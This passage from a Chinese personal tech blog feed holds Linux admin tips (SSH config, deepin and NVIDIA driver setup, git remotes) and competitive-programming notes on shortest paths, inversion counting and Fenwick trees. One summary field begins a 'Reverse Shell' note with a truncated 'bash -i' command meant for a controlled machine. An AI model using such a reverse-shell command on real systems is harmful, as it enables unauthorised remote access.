~/.ssh/authorized_keys</code>，注意，这个命令会覆盖原有的<code>authorized_keys</code>内容</li></ul><h4 id="本地配置VPS别名"><a href="#本地配置VPS别名" class="headerlink" title="本地配置VPS别名"></a>本地配置VPS别名</h4><ul><li><p>代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; ~/.ssh/config &lt;&lt;EOF</span><br><span class="line">Host VultrVPS</span><br><span class="line">    User root</span><br><span class="line">    Hostname 217.163.11.0</span><br><span class="line">    PreferredAuthentications publickey</span><br><span class="line">    IdentityFile ~/.ssh/VultrVPS_rsa</span><br><span class="line">    Port 22</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></li><li><p>以上可实现使用秘钥 ，多个VPS可以依次增加配置</p></li></ul><h3 id="Linux安装-md"><a href="#Linux安装-md" class="headerlink" title="Linux安装.md"></a>Linux安装.md</h3><h4 id="硬盘安装deepin"><a href="#硬盘安装deepin" class="headerlink" title="硬盘安装deepin"></a>硬盘安装deepin</h4><ul><li><a href="http://bbs.iaixue.com/forum.php?mod=viewthread&amp;tid=1812" target="_blank" rel="noopener">来源</a></li></ul><blockquote><p>将如下grub菜单放到/boot/grub/grub.cfg的menuentry菜单处/deepin-15.5-amd64.iso是deepin的镜像文件完整路径，可以自由地放在linux或windows分区中，区分大小写</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">menuentry &quot;UEFI Deepin 15.4 Linux ISO live&quot; --class deepin --class gnu-linux --class gnu --class os&#123;</span><br><span class="line">        echo &apos;booting...&apos;</span><br><span class="line">        set isofile=/deepin-15.5-amd64.iso</span><br><span class="line">        search --file $isofile --set=root</span><br><span class="line">        loopback loop $isofile</span><br><span class="line">        linux (loop)/live/vmlinuz.efi findiso=$isofile noprompt quiet boot=live ro deepin-installer locales=zh_CN.UTF-8 keyboard-configuration/layoutcode=us keyboard-configuration/variantcode= --  rootflags=sync</span><br><span class="line">        initrd (loop)/live/initrd.lz</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="刻录U盘安装Fedora或Centos"><a href="#刻录U盘安装Fedora或Centos" class="headerlink" title="刻录U盘安装Fedora或Centos"></a>刻录U盘安装Fedora或Centos</h4><ul><li>win下使用PowerISO刻录</li><li>使用简单的dd命令<code>dd if=xxx of=xxx bs=xx</code>失败</li><li>使用Ultraiso失败</li></ul><h4 id="U盘grub引导多个linux镜像安装"><a href="#U盘grub引导多个linux镜像安装" class="headerlink" title="U盘grub引导多个linux镜像安装"></a>U盘grub引导多个linux镜像安装</h4><ul><li><a href="https://my.oschina.net/abcfy2/blog/491140" target="_blank" rel="noopener">U盘引导多个linux镜像安装,同时支持BIOS和UEFI模式</a>。文中提供的deepin的那个grub配置无效</li><li><a href="https://bbs.deepin.org/forum.php?mod=viewthread&amp;tid=150783" target="_blank" rel="noopener">使用grub2制作启动U盘</a>，尝试把grub配置换为该链接的配置，可以启动到deepin进行安装，但是中途说挂载某分区失败从而安装失败<br><img src="./LinuxInstall_1.jpg" alt="错误信息"></li></ul><h3 id="OSC提供的代码make不过"><a href="#OSC提供的代码make不过" class="headerlink" title="OSC提供的代码make不过"></a>OSC提供的代码make不过</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">source code 9th/final-src-osc9e/ch2 </span><br><span class="line">➜ make                                                             </span><br><span class="line">make -C /lib/modules/4.9.0-deepin13-amd64/build M=/home/hzx/Program/source code 9th/final-src-osc9e/ch2 modules</span><br><span class="line"><span class="section">make[1]: Entering directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'</span></span><br><span class="line"><span class="section">arch/x86/Makefile:140: CONFIG_X86_X32 enabled but no binutils support</span></span><br><span class="line"><span class="section">make[3]: *** No rule to make target 'code'.  Stop.</span></span><br><span class="line"><span class="section">Makefile:150: recipe for target 'sub-make' failed</span></span><br><span class="line"><span class="section">make[2]: *** [sub-make] Error 2</span></span><br><span class="line"><span class="section">Makefile:8: recipe for target 'all' failed</span></span><br><span class="line"><span class="section">make[1]: *** [all] Error 2</span></span><br><span class="line"><span class="section">make[1]: Leaving directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'</span></span><br><span class="line"><span class="section">Makefile:3: recipe for target 'all' failed</span></span><br><span class="line"><span class="section">make: *** [all] Error 2</span></span><br></pre></td></tr></table></figure><p>解决方法，把source code 9th这个文件名的空格去掉</p><h3 id="vim-dos-unix"><a href="#vim-dos-unix" class="headerlink" title="vim dos unix"></a>vim dos unix</h3><ul><li>如果某文本文件的行末都有0d0a，则vim直接打开识别为dos。如果是vim -b 打开，识别为unix。如果最后一行不是0d0a，其他行是，不识别为dos。</li></ul><h3 id="删除文件名以-开头的文件"><a href="#删除文件名以-开头的文件" class="headerlink" title="删除文件名以-开头的文件"></a>删除文件名以<code>-</code>开头的文件</h3><ul><li>比如删除<code>-a</code>：<code>rm -- -a</code></li></ul><h3 id="文件的change，modification时间"><a href="#文件的change，modification时间" class="headerlink" title="文件的change，modification时间"></a>文件的change，modification时间</h3><ul><li>以下来自于实验：change是修改属性，比如<code>touch -d 1111 filename</code>，modification是修改内容</li></ul><h3 id="ctags-注意事项"><a href="#ctags-注意事项" class="headerlink" title="ctags 注意事项"></a>ctags 注意事项</h3><ul><li>如果某文件打开后编辑过，可能ctags打的tag就失效了（比如行号不对），所以跳转无效</li></ul><h3 id="watch命令"><a href="#watch命令" class="headerlink" title="watch命令"></a>watch命令</h3><ul><li><code>watch -n 0.1 ./a.o</code> 与<code>watch ./a.o -n 0.1</code>的区别是前者<code>-n 0.1</code>是watch的参数，后者是<code>./a.o</code>的参数</li></ul><h3 id="修复light-display-manger失败"><a href="#修复light-display-manger失败" class="headerlink" title="修复light display manger失败"></a>修复light display manger失败</h3><ul><li>通过启动时的错误信息，还有single模式中，service lightdm start后的错误信息（systemctl service ）可以知道light display manager启动失败</li><li>搜到的都说重新安装dde，但是需要网络，而single-user mode 是没有网络的。然后其他模式又没搜到要怎么进去，到是grub图形界面有提供一个带网络的recovery模式，不过我没有grub图形界面</li><li>就搜了搜在single模式联网——按照定义，single模式是没有网络的。然后联网后install dde，中途flatpak提示desktopRecord.service不存在，然后错误处理ctrl-c了dde的安装过程。然后后来按照dde的安装信息提示安装其他组件console-setup，然后使用sudo apt-get install –reinstall dde修复了dde的安装（apt -f在这里是没用的）</li><li>不知道为什么中途提示proxychain 的配置文件修改了</li><li>本来想着要是没网，就下个lightdm 来安装，结果没有binary的文件，装不了。</li><li>后来安装好dde后startx老是说成功退出——没有任何报错信息，都是成功，连退出都是成功退出，但是就是不符合我的预期</li></ul><h3 id="查看glibc版本"><a href="#查看glibc版本" class="headerlink" title="查看glibc版本"></a>查看glibc版本</h3><ul><li><code>ldd --version</code></li><li><code>getconf GNU_LIBC_VERSION</code></li></ul><h3 id="shell使用-时的SIGPIPE"><a href="#shell使用-时的SIGPIPE" class="headerlink" title="shell使用|时的SIGPIPE"></a>shell使用<code>|</code>时的SIGPIPE</h3><ul><li>比如<code>proc_1 | proc_2</code>，如果第二个进程关闭，第一个就会管道破裂，如果没有处理就会die</li></ul><h3 id="安装nvidia驱动"><a href="#安装nvidia驱动" class="headerlink" title="安装nvidia驱动"></a>安装nvidia驱动</h3><ul><li>在nvidia官网下程序</li><li><code>telinit 3</code>关掉<code>X server</code>（或者是systemctl stop lightdm.service）</li><li><p>安装过程中需要编译内核模块，编译时使用的gcc版本要与编译内核的gcc版本一致</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/version</span><br><span class="line">Linux version 4.15.0-29deepin-generic (pbuilder@zs-PC) (gcc version 7.3.0 (Debian 7.3.0-19)) #31 SMP Fri Jul 27 07:12:08 UTC 2018</span><br></pre></td></tr></table></figure></li><li><p>安装时，如果有驱动占用了gpu，那么会失败，在<code>/etc/modprobe.d/</code>加一个文件（命名为<code>*.conf</code>）</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">blacklist nouveau</span><br><span class="line">blacklist rivafb</span><br><span class="line">blacklist rivatv</span><br><span class="line">blacklist nvidiafb</span><br><span class="line"></span><br><span class="line"># 下面这几条应该可以不用，我不加也成功</span><br><span class="line">options nouveau modeset=0 </span><br><span class="line">options rivafb modeset=0</span><br><span class="line">options rivatv modeset=0</span><br><span class="line">options nvidiafb modeset=0</span><br></pre></td></tr></table></figure></li><li><p>安装过程中我一开始选使用dkms，但是失败，后来没选，也失败了几次，所以不清楚dkms的情况</p></li><li>安装后要运行<code>nvidia-xconfig</code>配置<code>/etc/X11/xorg.conf</code>，或者自己手动配置（然而我这里一直失败，一加相关的东西就启动卡住，而且也没有报错信息——我们又看其他信息，不知道其他信息有没有提示）</li><li>然而。事情没那么简单，我装了nvidia驱动后，deepin-wm cpu占用率飙升，nvidia-smi看不到使用gpu的进程，gg。没办法，卸了驱动，删了blacklist</li><li>后来发现deepin有个gpu driver manager，运行后，跑了很久，重启后还跑了很久，还看到一堆error，然后还开一个渲染画面让我看看渲染得咋样，然后后来启动成功，nvidia-smi也看到有deepin-wm的进程跑在gpu上，deepin-wm的cpu占用率也没有飙升，还行</li></ul><h3 id="Tilix-dont-inherit-the-directory"><a href="#Tilix-dont-inherit-the-directory" class="headerlink" title="Tilix dont inherit the directory"></a>Tilix dont inherit the directory</h3><ul><li><a href="https://github.com/gnunn1/tilix/wiki/VTE-Configuration-Issue" target="_blank" rel="noopener">The VTE matter this</a></li></ul><h3 id="sogouPinyin候选框异常解决方法"><a href="#sogouPinyin候选框异常解决方法" class="headerlink" title="sogouPinyin候选框异常解决方法"></a>sogouPinyin候选框异常解决方法</h3><ul><li>其实也不算解决，我在配置文件里把所有能关掉skin的选项都关了，sougou还是不使用fcitx的skin，删了<code>~/.config</code>下面的sogou相关配置文件也没用</li><li>后来发现，如果有其他输入法一起，然后切换过其他输入法，sogoupinyin的皮肤就跟那个输入法的一样（也不知道是不是一样，我的fcitx不能切换皮肤，所有只有一个皮肤）</li></ul><h3 id="cache的详细信息（包括相联度，电压等）"><a href="#cache的详细信息（包括相联度，电压等）" class="headerlink" title="cache的详细信息（包括相联度，电压等）"></a>cache的详细信息（包括相联度，电压等）</h3><ul><li><code>sudo dmidecode -t 7</code></li><li><code>getconf -a | grep CACHE</code></li></ul><h3 id="设置默认浏览器"><a href="#设置默认浏览器" class="headerlink" title="设置默认浏览器"></a>设置默认浏览器</h3><ul><li><code>xdg-settings set default-web-browser chrome.desktop</code></li><li><code>xdg-settings get default-web-browser</code>获取值</li><li>关于desktop文件的<code>Exec</code>段中的后缀，<a href="https://specifications.freedesktop.org/desktop-entry-spec/latest/ar01s07.html" target="_blank" rel="noopener">doc</a><blockquote><p>%i    The Icon key of the desktop entry expanded as two arguments, first –icon and then the value of the Icon key. Should not expand to any arguments if the Icon key is empty or missing.<br>%c    The translated name of the application as listed in the appropriate Name key in the desktop entry.<br>%k    The location of the desktop file as either a URI (if for example gotten from the vfolder system) or a local filename or empty if no location is known.<br>%f    A single file name (including the path), even if multiple files are selected. The system reading the desktop entry should recognize that the program in question cannot handle multiple file arguments, and it should should probably spawn and execute multiple copies of a program for each selected file if the program is not able to handle additional file arguments. If files are not on the local file system (i.e. are on HTTP or FTP locations), the files will be copied to the local file system and %f will be expanded to point at the temporary file. Used for programs that do not understand the URL syntax.<br>%F    A list of files. Use for apps that can open several local files at once. Each file is passed as a separate argument to the executable program.<br>%u    A single URL. Local files may either be passed as file: URLs or as file path.<br>%U    A list of URLs. Each URL is passed as a separate argument to the executable program. Local files may either be passed as file: URLs or as file path.</p></blockquote></li></ul><h3 id="github账户有设置ssh但是仓库push还是要用户密码的解决方法"><a href="#github账户有设置ssh但是仓库push还是要用户密码的解决方法" class="headerlink" title="github账户有设置ssh但是仓库push还是要用户密码的解决方法"></a>github账户有设置ssh但是仓库push还是要用户密码的解决方法</h3><ul><li>这是因为remote add时使用的是https，而不是ssh</li><li><code>git remote -v</code>可以看到是https链接</li><li><code>git remote set-url origin git@github.com:USERNAME/REPOSITORY.git</code>改为ssh</li><li><a href="https://help.github.com/articles/changing-a-remote-s-url/" target="_blank" rel="noopener">参考</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Reverse-Shell&quot;&gt;&lt;a href=&quot;#Reverse-Shell&quot; class=&quot;headerlink&quot; title=&quot;Reverse Shell&quot;&gt;&lt;/a&gt;Reverse Shell&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;受控机器上执行&lt;code&gt;bash -i
      
    
    </summary>
    
      <category term="运维" scheme="https://h-zex.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="ITOps" scheme="https://h-zex.github.io/tags/ITOps/"/>
    
  </entry>
  
  <entry>
    <title>My ACM Note</title>
    <link href="https://h-zex.github.io/2018/02/02/My-ACM-Note/"/>
    <id>https://h-zex.github.io/2018/02/02/My-ACM-Note/</id>
    <published>2018-02-02T05:31:40.000Z</published>
    <updated>2019-02-03T11:44:56.873Z</updated>
    
    <content type="html"><![CDATA[<h3 id="全源最短路径的一种错误解法"><a href="#全源最短路径的一种错误解法" class="headerlink" title="全源最短路径的一种错误解法"></a>全源最短路径的一种错误解法</h3><ul><li><p>错误代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (~<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N)) &#123;</span><br><span class="line">        <span class="comment">// assume that if no edge i-&gt;j, then input w[i][j] will be INF</span></span><br><span class="line">        <span class="comment">// and assume that w[i][i] == 0</span></span><br><span class="line">        FWD(i, <span class="number">0</span>, N) &#123;</span><br><span class="line">            FWD(j, <span class="number">0</span>, N) &#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;w[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(dp, <span class="number">0xff</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line">        FWD(i, <span class="number">0</span>, N) &#123;</span><br><span class="line">            FWD(j, <span class="number">0</span>, N) &#123;</span><br><span class="line">                <span class="comment">// if i == j, dfs can still return true answer</span></span><br><span class="line">                dfs(i, j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        FWD(i, <span class="number">0</span>, N) &#123;</span><br><span class="line">            FWD(j, <span class="number">0</span>, N) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%15d"</span>, dp[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> visit[MAXV];</span><br><span class="line"><span class="keyword">int</span> __dfs(<span class="keyword">int</span> now, <span class="keyword">int</span> target);</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> from, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(visit, <span class="number">0</span>, <span class="keyword">sizeof</span>(visit));</span><br><span class="line">    visit[from] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> __dfs(from, target);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __dfs(<span class="keyword">int</span> now, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dp[now][target] &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> dp[now][target];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (now == target) &#123;</span><br><span class="line">        dp[now][target] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// visit[now] will never be true;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans = INF;</span><br><span class="line">    FWD(i, <span class="number">0</span>, N) &#123;</span><br><span class="line">        <span class="keyword">if</span> (visit[i] || w[now][i] == INF || i==now) &#123; <span class="comment">// avoid rings and not edge</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visit[i] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> p = __dfs(i, target) + w[now][i];</span><br><span class="line">        visit[i] = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (p &lt; ans) &#123;</span><br><span class="line">            NEXT[now][target] = i; <span class="comment">// record the NEXT vertex of i in the shortest path now-&gt;target</span></span><br><span class="line">            ans = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[now][target] = ans;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>不可以使用这种dp</p></li><li><p>对于每对点执行dfs，然后执行过程中，记忆化搜索。当然，为了避免执行过程出现不断的走环路的情况，需要使用visit，避免dfs过程中走环路。</p></li><li><p>虽然复杂度是$O(V^3)$ ，但是算法是错的</p></li><li><p>记忆化搜索计算$(begin,target)$ 时，假设dfs过程中经过了点<code>i</code> ，为了避免环，<code>i</code>不可以经过<code>begin</code>，但是，可能$(i,target)$ 的最优路径就是<code>i</code>经过点<code>begin</code> 到达的。</p></li><li><p>但是，记忆化过程中，却把在dfs$(begin,target)$过程中 计算出来的$(i,target)$ 作为<code>i</code> 到<code>target</code> 的结果。</p></li></ul><h3 id="NYOJ7"><a href="#NYOJ7" class="headerlink" title="NYOJ7"></a>NYOJ7</h3><blockquote><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h5><p>一个街区有很多住户，街区的街道只能为东西、南北两种方向。<br>住户只可以沿着街道行走。<br>各个街道之间的间隔相等。<br>用(x,y)来表示住户坐在的街区。<br>例如（4,20），表示用户在东西方向第4个街道，南北方向第20个街道。<br>现在要建一个邮局，使得各个住户到邮局的距离之和最少。<br>求现在这个邮局应该建在那个地方使得所有住户距离之和最小；</p><h5 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述:"></a>输入描述:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 第一行一个整数n&lt;20，表示有n组测试数据，下面是n组数据;</span><br><span class="line">&gt; 每组第一行一个整数m&lt;20,表示本组有m个住户，下面的m行每行有两个整数0&lt;x,y&lt;100，表示某个用户所在街区的坐标。</span><br><span class="line">&gt; m行后是新一组的数据；</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h5 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述:"></a>输出描述:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 每组数据输出到邮局最小的距离和，回车结束；</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h5 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入:"></a>样例输入:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; 2</span><br><span class="line">&gt; 3</span><br><span class="line">&gt; 1 1</span><br><span class="line">&gt; 2 1</span><br><span class="line">&gt; 1 2</span><br><span class="line">&gt; 5</span><br><span class="line">&gt; 2 9 </span><br><span class="line">&gt; 5 20</span><br><span class="line">&gt; 11 9</span><br><span class="line">&gt; 1 1</span><br><span class="line">&gt; 1 20</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h5 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出:"></a>样例输出:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 2</span><br><span class="line">&gt; 44</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>考虑横坐标的情况，取那个横坐标可以使得大家的在横坐标上需要走的距离最短？显然是中位数——反证法，加入有N个点，如果N是奇数，那么中位数就是d[N/2]，然后，尝试采用第N/2-1个点计算，显然，总量的变化是（设 t = d[N/2]-d[N/2-1] ），$+t<em>(N/2+1)-t</em>N/2$ ，也就是缩短的对于前N/2的用户来说，是缩短了，但是对于后面N/2+1个用户来说延长了</li><li>所以，无论y坐标取值多少，x坐标都要取中位数。同理，y也要取中位数</li></ul><h3 id="01背包"><a href="#01背包" class="headerlink" title="01背包"></a>01背包</h3><ul><li>动态规划算法是伪多项式复杂度$O(NW)$，如果W很大，那么可能，直接枚举N元素的集合的所有子集会更快一些</li></ul><h3 id="找出一个序列中任意长度的逆序对"><a href="#找出一个序列中任意长度的逆序对" class="headerlink" title="找出一个序列中任意长度的逆序对"></a>找出一个序列中任意长度的逆序对</h3><ul><li>首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i&gt;x_{i+1}&gt;x_{i+2}&gt;…$那么就是逆序对</li><li>主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量</li><li>假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n]</li><li>首先看看如何求二元逆序对<ul><li>从左到右扫描序列，对于值位置为<code>i</code>的值<code>x</code>，flag[x]+=1</li><li>然后此时，以该x结尾的逆序对的数量就是$\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i]</li><li>那么result的数组的和就是逆序对的数量</li><li>同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对</li></ul></li><li>三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result_2数组)，此时设另外的两个数组int flag_3[MAX+1], int result_3[n];<ul><li>同样扫描序列，对于位置为<code>i</code>的数<code>x</code>，取出result_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag_3[x]记录了截止目前，以x结尾的二元组逆序对的数量</li><li>求$\sum_{j=x+1}^{MAX}flag_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中</li><li>到最后，result_3就是结果</li></ul></li><li>更多元组的也如此思路</li><li>这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对</li><li>对于n元逆序对，同理，数组记录了当前已有的数<code>x</code>作为<code>最后一个元素是x的n-1元逆序对</code>的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与<code>比他大的数代表的n-1元逆序对</code>形成了更长的逆序对</li><li>然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第<code>i</code>位的值是<code>x</code>）</li></ul><blockquote><p>3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）</p></blockquote><h3 id="关于使用优先队列的bfs"><a href="#关于使用优先队列的bfs" class="headerlink" title="关于使用优先队列的bfs"></a>关于使用优先队列的bfs</h3><ul><li>其实就是dijstra单源最短路径算法</li><li>关于O((V+E)lgV)：对每个点都需要从堆中pop出来（除了源点），对于每条边，都需要把该边对应的一个点压进堆里或者decrease key，consider that，如果一个点被pop出来，那么该点就在result set里，所以不会再被压到堆里。所以是O((V+E)lgV)，如果使用斐波那契堆，因为压到堆里以及decrease key的代价是O(1)，所以是O(VlgV+E)</li></ul><h3 id="DP"><a href="#DP" class="headerlink" title="DP"></a>DP</h3><ul><li>DP要找到什么因素影响了当前你要求的东西，有影响的我们就处理，没影响的我们不用管</li></ul><h3 id="浮点数输入"><a href="#浮点数输入" class="headerlink" title="浮点数输入"></a>浮点数输入</h3><ul><li>由于是二进制，所以有些十进制有限小数成了无限的，所以读取时会截断，所以要加上一个偏移量（比如读入到小数点后6位，可以加一个$2*10^{-7}$，这样，截断部分如果比较大，就可以反映出来，如果比较小，不会对产生进位，则没影响）</li></ul><h3 id="枚举所有素数"><a href="#枚举所有素数" class="headerlink" title="枚举所有素数"></a>枚举所有素数</h3><ul><li>$O(N)$ 的做法 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> CNT = (<span class="keyword">int</span>)<span class="number">1e9</span>+<span class="number">10</span>;</span><br><span class="line"><span class="keyword">bool</span> a[CNT];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    a[<span class="number">0</span>] = a[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">    FWD(i, <span class="number">2</span>, CNT) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">2</span> * i; j &lt; CNT; j += i) &#123;</span><br><span class="line">             a[j] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="树状数组"><a href="#树状数组" class="headerlink" title="树状数组"></a>树状数组</h3><ul><li><p>注意，a[0]是没有放东西的，因为$i-lowbit(i)+1 &gt; 0$</p></li><li><p>插线问点中，每一点 i 的值都是 sum(a[1] to a[i])。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 